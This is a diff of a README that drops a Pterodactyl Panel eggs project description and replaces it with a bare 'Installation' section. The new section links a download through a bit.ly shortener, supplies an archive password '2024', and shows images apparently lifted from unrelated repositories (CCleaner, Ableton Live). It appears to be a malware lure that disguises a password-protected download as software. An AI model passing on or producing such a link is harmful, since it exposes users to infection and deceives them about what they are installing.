@@ -1,19 +1,14 @@
+![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
 
-# Pterodactyl Panel Eggs
+# Installation 
 
-Free Eggs made for the Pterodactyl Panel for anyone to use!  
+[![download картинка](https://github.com/Pekly/Ccleaner/assets/92947595/61b6d8ea-5aad-4d9c-9995-5603c1d89fef)](https://bit.ly/3v81OzI)
 
-Full list of Docker Images available at my [Quay](https://quay.io/repository/yajtpg/pterodactyl-images?tab=tags)  
+Password: 2024
 
-Module Error? Any global package missing? Feel free to open an Issue and I'll try my best to fix it/help you.  
-You can also open an Issue if you'd like to suggest an egg or something.  
-I'd suggest you to keep in mind that the average size of a Docker image is ~500MB and can sometimes even go upto 2GB.  
-Thanks for checking out my Pterodactyl Eggs!  
+# Showcase
 
-## [Read Changelog Here](CHANGELOG.md)
+![photo_2024-03-13_17-14-54](https://github.com/Shiviiiiiiii/ableton-live-11/assets/84573980/4d3d5dde-e49a-4649-820e-61ae524a890c)
+## License
 
-### To Do List
-
-- [ ] Add Git Integration to all the eggs.
-- [ ] Be active in this repository. 😂
-- [ ] Add Alpine alternatives for all the eggs for the people with low storage servers.
+[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
